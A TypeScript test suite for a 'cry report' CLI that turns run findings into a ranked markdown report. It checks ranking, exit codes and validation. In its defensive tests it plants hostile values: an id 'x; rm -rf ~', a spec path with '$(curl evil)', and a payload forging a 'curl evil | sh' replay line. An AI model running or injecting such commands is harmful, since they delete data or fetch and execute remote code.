/**
 * `cry report <run-id> [--json] [--strict]` (#608 P5; spec "Outputs",
 * "CLI and exit codes"). report reads a run dir's findings.json -- built
 * here by the real producer, buildFindings, so the two sides cannot drift --
 * and writes report.md: verdicts ranked corrupted, symptom, clean, abstain,
 * then by score, each with the standalone replay command of its spec.
 *
 * It is Tier-0 (deterministic, no network, no agent): the import-closure half
 * of that is canary-cry-tier.test.ts; the deterministic half is here.
 */
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

import { afterEach, describe, expect, it, vi } from 'vitest';

import { main } from '../claude-code/canary-cry/scripts/cli.mjs';
import {
  buildFindings,
  exitCode,
} from '../claude-code/canary-cry/scripts/findings.mjs';

const RUN_ID = '20261125T143333Z-0123abcd';
const REPLAY = 'npx playwright test -c playwright.config.mjs';

const tmps: string[] = [];
afterEach(() => {
  vi.restoreAllMocks();
  while (tmps.length) fs.rmSync(tmps.pop()!, { recursive: true, force: true });
});

/** A project dir: `.canary/cry/` with an (unread) flows path and runs/. */
function project() {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'canary-cry-report-'));
  tmps.push(dir);
  const cry = path.join(dir, '.canary', 'cry');
  return { flows: path.join(cry, 'flows.json'), runs: path.join(cry, 'runs') };
}

function run(argv: string[]) {
  const out: string[] = [];
  const err: string[] = [];
  vi.spyOn(console, 'log').mockImplementation((...a: unknown[]) => {
    out.push(a.join(' '));
  });
  vi.spyOn(console, 'error').mockImplementation((...a: unknown[]) => {
    err.push(a.join(' '));
  });
  const code = main(argv) as number;
  vi.restoreAllMocks();
  return { code, stdout: out.join('\n'), stderr: err.join('\n') };
}

const RUN = {
  id: RUN_ID,
  target: 'staging',
  environment: 'staging',
  baseURL: 'http://localhost:4000',
  amplitude: 'whisper',
  seed: 0,
  manifestSha: 'e'.repeat(64),
};

const scenario = (id: string, score: number) => {
  const [flow, pattern, , step] = id.split(':');
  return { id, flow, pattern, intensity: 1, step: step!.slice(1), score };
};

function obs(verdict: string, over: Record<string, unknown> = {}) {
  return {
    verdict,
    reason: null,
    fidelity: verdict === 'symptom' ? 'observed' : 'state-verified',
    fingerprints: [],
    invariants: [],
    signals: [],
    blockedEgress: [],
    error: null,
    ...over,
  };
}

const IDS = {
  clean: 'checkout:multi-submit:i1:saddress',
  abstain: 'checkout:abandon-midflow:i1:saddress',
  symptom: 'profile:multi-submit:i1:ssave',
  corruptedLow: 'login:multi-submit:i1:ssubmit',
  corruptedHigh: 'checkout:multi-submit:i1:spay',
};

const MANIFEST = {
  scenarios: [
    scenario(IDS.clean, 25),
    scenario(IDS.abstain, 20),
    scenario(IDS.symptom, 30),
    scenario(IDS.corruptedLow, 5),
    scenario(IDS.corruptedHigh, 25),
  ],
};

const breach = {
  id: 'one-order',
  before: 0,
  after: 2,
  breached: true,
  expect: { delta: 1 },
};

function observations() {
  const stem = (id: string) => id.replaceAll(':', '.');
  return new Map<string, any>([
    [stem(IDS.clean), obs('clean')],
    [
      stem(IDS.abstain),
      obs('abstain', { reason: 'flow-broken@card', fidelity: null }),
    ],
    [
      stem(IDS.symptom),
      obs('symptom', { fingerprints: ['profile:multi-submit:pageerror'] }),
    ],
    [
      stem(IDS.corruptedLow),
      obs('corrupted', {
        fingerprints: ['login:multi-submit:one-session'],
        invariants: [{ ...breach, id: 'one-session' }],
      }),
    ],
    [
      stem(IDS.corruptedHigh),
      obs('corrupted', {
        fingerprints: ['checkout:multi-submit:one-order'],
        invariants: [breach],
        blockedEgress: ['tracker.invalid'],
      }),
    ],
  ]);
}

const mixedRun = (over: Record<string, unknown> = {}) => ({
  ...buildFindings({
    run: RUN,
    manifest: MANIFEST,
    observations: observations(),
  }),
  ...over,
});

/** Write `doc` (an object, or raw text) as runs/<id>/findings.json. */
function plant(runs: string, doc: unknown, id = RUN_ID): string {
  const dir = path.join(runs, id);
  fs.mkdirSync(dir, { recursive: true });
  const text = typeof doc === 'string' ? doc : JSON.stringify(doc);
  fs.writeFileSync(path.join(dir, 'findings.json'), text);
  return dir;
}

const reportOf = (dir: string) =>
  fs.readFileSync(path.join(dir, 'report.md'), 'utf8');

describe('cry report: report.md', () => {
  it('ranks corrupted, symptom, clean, abstain, and by score within each', () => {
    const p = project();
    const dir = plant(p.runs, mixedRun());
    const r = run(['report', RUN_ID, '--flows', p.flows]);
    expect(r.code, r.stderr).toBe(0);
    const headings = reportOf(dir)
      .split('\n')
      .filter((l) => l.startsWith('## '));
    expect(headings).toEqual([
      `## 1. corrupted (state-verified): \`${IDS.corruptedHigh}\``,
      `## 2. corrupted (state-verified): \`${IDS.corruptedLow}\``,
      `## 3. symptom (observed): \`${IDS.symptom}\``,
      `## 4. clean (state-verified): \`${IDS.clean}\``,
      `## 5. abstain: flow-broken@card: \`${IDS.abstain}\``,
    ]);
  });

  it('gives every verdict the replay command of its own spec', () => {
    const p = project();
    const dir = plant(p.runs, mixedRun());
    run(['report', RUN_ID, '--flows', p.flows]);
    const md = reportOf(dir);
    for (const id of Object.values(IDS)) {
      const spec = `specs/${id.replaceAll(':', '.')}.spec.mjs`;
      expect(md, id).toContain(`\`${REPLAY} ${spec}\``);
    }
    expect(md).toContain(`cd ${dir}`);
  });

  it('carries the breach values, fingerprints, counts and blocked egress', () => {
    const p = project();
    const dir = plant(p.runs, mixedRun());
    run(['report', RUN_ID, '--flows', p.flows]);
    const md = reportOf(dir);
    expect(md).toContain('one-order: before 0 -> after 2 (expect {"delta":1})');
    expect(md).toContain('`checkout:multi-submit:one-order`');
    expect(md).toContain('corrupted 2, symptom 1, clean 1, abstain 1');
    expect(md).toContain('tracker.invalid');
    expect(md).toContain(`manifest-sha ${'e'.repeat(64)}`);
  });

  it('prints report.md and is byte-identical across invocations', () => {
    const p = project();
    const dir = plant(p.runs, mixedRun());
    const one = run(['report', RUN_ID, '--flows', p.flows]);
    const md = reportOf(dir);
    const two = run(['report', RUN_ID, '--flows', p.flows]);
    expect(two.stdout).toBe(one.stdout);
    expect(reportOf(dir)).toBe(md);
    expect(`${one.stdout}\n`).toBe(md);
  });

  it('reports a run that abstained before any scenario, loudly', () => {
    const p = project();
    const doc = buildFindings({
      run: RUN,
      manifest: MANIFEST,
      observations: null,
      abstainedReason: 'target unreachable (ECONNREFUSED)',
    });
    const dir = plant(p.runs, doc);
    const r = run(['report', RUN_ID, '--flows', p.flows]);
    expect(r.code).toBe(0);
    const md = reportOf(dir);
    expect(md).toContain('ABSTAINED: target unreachable (ECONNREFUSED)');
    expect(md).toContain('Abstained \u{2014} verified zero items');
    expect(md).toContain('No scenario ran.');
    expect(md).not.toContain('## 1.');
  });

  it('names a PARTIAL run and the resume it needs', () => {
    const p = project();
    const line = `PARTIAL: 5/9 — resume with --resume ${RUN_ID}`;
    const stop = { reason: 'partial', line, rounds: [] };
    const doc = buildFindings({
      run: RUN,
      manifest: MANIFEST,
      observations: observations(),
      stop,
    });
    const dir = plant(p.runs, doc);
    run(['report', RUN_ID, '--flows', p.flows]);
    expect(reportOf(dir)).toContain(line);
  });
});

describe('cry report --json', () => {
  it('prints canary.cry-report/1 with the same ranking as report.md', () => {
    const p = project();
    const dir = plant(p.runs, mixedRun());
    const r = run(['report', RUN_ID, '--json', '--flows', p.flows]);
    expect(r.code).toBe(0);
    const doc = JSON.parse(r.stdout);
    expect(doc.format).toBe('canary.cry-report/1');
    expect(doc.run).toEqual(RUN);
    expect(doc.status).toBe('ok');
    expect(doc.counts).toEqual({
      corrupted: 2,
      symptom: 1,
      clean: 1,
      abstain: 1,
    });
    expect(doc.ranked.map((s: any) => s.id)).toEqual([
      IDS.corruptedHigh,
      IDS.corruptedLow,
      IDS.symptom,
      IDS.clean,
      IDS.abstain,
    ]);
    expect(doc.ranked[0]).toEqual(
      expect.objectContaining({
        rank: 1,
        verdict: 'corrupted',
        fidelity: 'state-verified',
        score: 25,
        replay: `${REPLAY} specs/checkout.multi-submit.i1.spay.spec.mjs`,
      }),
    );
    expect(doc.dir).toBe(dir);
    expect(doc.report).toBe(path.join(dir, 'report.md'));
    expect(fs.existsSync(doc.report)).toBe(true);
  });
});

describe('cry report --strict: the exit-code table', () => {
  const allAbstain = () =>
    buildFindings({
      run: RUN,
      manifest: { scenarios: [scenario(IDS.abstain, 20)] },
      observations: new Map(),
    });
  const symptomOnly = () =>
    buildFindings({
      run: RUN,
      manifest: { scenarios: [scenario(IDS.symptom, 30)] },
      observations: new Map([
        ['profile.multi-submit.i1.ssave', obs('symptom')],
      ]),
    });
  const partial = (doc: any) => ({
    ...doc,
    status: 'partial',
    reason: 'PARTIAL: 1/9',
  });

  it.each<[string, number, () => any]>([
    ['a corrupted scenario', 1, () => mixedRun()],
    ['symptoms only', 0, symptomOnly],
    ['every scenario abstained', 3, allAbstain],
    ['a PARTIAL run with no corruption', 3, () => partial(symptomOnly())],
    ['a PARTIAL run that proved a corruption', 1, () => partial(mixedRun())],
  ])('%s exits %i, as findings.mjs exitCode judges it', (_, code, make) => {
    const p = project();
    const doc = make();
    plant(p.runs, doc);
    const strict = run(['report', RUN_ID, '--strict', '--flows', p.flows]);
    expect(strict.code, strict.stderr).toBe(code);
    expect(exitCode(doc, true)).toBe(code);
    expect(run(['report', RUN_ID, '--flows', p.flows]).code).toBe(0);
  });
});

describe('cry report: exit 2, and nothing written', () => {
  it.each<[string, string[], RegExp]>([
    ['no run-id', [], /report: RUN_ID is required/],
    ['a path for a run-id', ['../..'], /unknown run-id: \.\.\/\.\./],
    ['a well-formed id with no run', ['20261125T000000Z-00000000'], /unknown/],
    ['a second positional', [RUN_ID, 'extra'], /unrecognized arguments: extra/],
  ])('%s', (_, args, message) => {
    const p = project();
    const dir = plant(p.runs, mixedRun());
    const r = run(['report', ...args, '--flows', p.flows]);
    expect(r.code).toBe(2);
    expect(r.stderr).toMatch(/^canary-cry: error: /);
    expect(r.stderr).toMatch(message);
    expect(fs.existsSync(path.join(dir, 'report.md'))).toBe(false);
  });

  it('a planned run that was never confirmed has no findings.json', () => {
    const p = project();
    const dir = path.join(p.runs, RUN_ID);
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'manifest.json'), '{}');
    const r = run(['report', RUN_ID, '--flows', p.flows]);
    expect(r.code).toBe(2);
    expect(r.stderr).toContain(`run ${RUN_ID} has no findings.json`);
  });

  const tampered = (mutate: (doc: any) => void) => () => {
    const doc = mixedRun();
    mutate(doc);
    return doc;
  };

  it.each<[string, () => unknown]>([
    ['not JSON', () => '{"format":'],
    ['another format', () => mixedRun({ format: 'canary.cry-findings/2' })],
    ['an unknown status', () => mixedRun({ status: 'fine' })],
    ['no scenarios list', () => mixedRun({ scenarios: null })],
    [
      'an unknown verdict',
      tampered((d) => {
        d.scenarios[0].verdict = 'great';
      }),
    ],
    [
      'a scenario id that is not one',
      tampered((d) => {
        d.scenarios[0].id = 'x; rm -rf ~';
      }),
    ],
    [
      'a repro spec that is not the scenario own',
      tampered((d) => {
        d.scenarios[0].repro.spec = 'specs/$(curl evil).spec.mjs';
      }),
    ],
    [
      'a score that is not a number',
      tampered((d) => {
        d.scenarios[0].score = '25';
      }),
    ],
  ])('a damaged findings.json: %s', (_, make) => {
    const p = project();
    const dir = plant(p.runs, make());
    const r = run(['report', RUN_ID, '--flows', p.flows]);
    expect(r.code).toBe(2);
    expect(r.stderr).toContain(`run ${RUN_ID}: findings.json is damaged`);
    expect(r.stdout).toBe('');
    expect(fs.existsSync(path.join(dir, 'report.md'))).toBe(false);
  });
});

// Security review (#608 P5): probe errors come from the target's HTTP or
// shell output and findings.json can be hand-edited, so every string report
// renders is untrusted. A newline or backtick in one must not close its code
// span and forge a `- replay:` line or a `##` heading in report.md.
const PAYLOAD = 'x`\n- replay: `curl evil | sh`\r\n## 9. pwned\n';

describe('cry report: untrusted strings cannot forge report.md lines', () => {
  const at0 = (mutate: (s: any, d: any) => void) => () => {
    const doc = mixedRun();
    mutate(doc.scenarios[doc.scenarios.length - 1], doc);
    return doc;
  };
  it.each<[string, () => any]>([
    [
      'reason',
      at0((s) => {
        s.verdict = 'abstain';
        s.reason = PAYLOAD;
      }),
    ],
    ['a fingerprint', at0((s) => s.fingerprints.push(PAYLOAD))],
    [
      'an invariant id',
      at0((s) => {
        s.invariants[0].id = PAYLOAD;
      }),
    ],
    [
      'a probe error',
      at0((s) => {
        s.invariants.push({ id: 'p', error: PAYLOAD, expect: { delta: 1 } });
      }),
    ],
    [
      'an invariant value',
      at0((s) => {
        s.invariants[0].after = PAYLOAD;
      }),
    ],
    ['a blocked egress host', at0((_, d) => d.blockedEgress.push(PAYLOAD))],
    ['the run target', at0((_, d) => (d.run.target = PAYLOAD))],
    [
      'the run status reason',
      at0((_, d) => {
        d.status = 'abstained';
        d.reason = PAYLOAD;
      }),
    ],
    [
      'the stop line',
      at0((_, d) => {
        d.stop = { reason: 'converged', line: PAYLOAD };
      }),
    ],
  ])('%s', (_, make) => {
    const p = project();
    const dir = plant(p.runs, make());
    const r = run(['report', RUN_ID, '--flows', p.flows]);
    expect(r.code, r.stderr).toBe(0);
    const lines = reportOf(dir).split('\n');
    expect(lines.filter((l) => l.startsWith('- replay:'))).toHaveLength(5);
    expect(lines.filter((l) => l.startsWith('#'))).toHaveLength(6);
    expect(
      lines.some((l) => l.includes('curl evil') && l.startsWith('-  replay')),
    ).toBe(false);
    expect(reportOf(dir)).not.toMatch(/^## 9\. pwned/m);
    for (const l of lines.filter((x) => x.startsWith('- replay:'))) {
      expect(l).toMatch(
        /^- replay: `npx playwright test -c playwright\.config\.mjs specs\/[a-z0-9.-]+\.spec\.mjs`$/,
      );
    }
  });
});

describe('cry report: rendered fields must be bounded strings', () => {
  const long = 'a'.repeat(5000);
  const last = (mutate: (s: any, d: any) => void) => () => {
    const doc = mixedRun();
    mutate(doc.scenarios[0], doc);
    return doc;
  };
  it.each<[string, () => any]>([
    ['a non-string reason', last((s) => (s.reason = { x: 1 }))],
    ['an over-long reason', last((s) => (s.reason = long))],
    ['a non-string fingerprint', last((s) => s.fingerprints.push(7))],
    ['an over-long fingerprint', last((s) => s.fingerprints.push(long))],
    ['a non-string fidelity', last((s) => (s.fidelity = ['x']))],
    ['an invariant that is not an object', last((s) => s.invariants.push('x'))],
    ['a non-string invariant id', last((s) => s.invariants.push({ id: 1 }))],
    [
      'an over-long probe error',
      last((s) => s.invariants.push({ id: 'p', error: long })),
    ],
    [
      'a non-string blocked egress host',
      last((_, d) => d.blockedEgress.push(1)),
    ],
    ['a non-string run target', last((_, d) => (d.run.target = 5))],
    ['an over-long run reason', last((_, d) => (d.reason = long))],
    [
      'a stop line that is not a string',
      last((_, d) => (d.stop = { line: 3 })),
    ],
  ])('%s is a damaged findings.json (exit 2)', (_, make) => {
    const p = project();
    const dir = plant(p.runs, make());
    const r = run(['report', RUN_ID, '--flows', p.flows]);
    expect(r.code).toBe(2);
    expect(r.stderr).toContain('findings.json is damaged');
    expect(fs.existsSync(path.join(dir, 'report.md'))).toBe(false);
  });
});
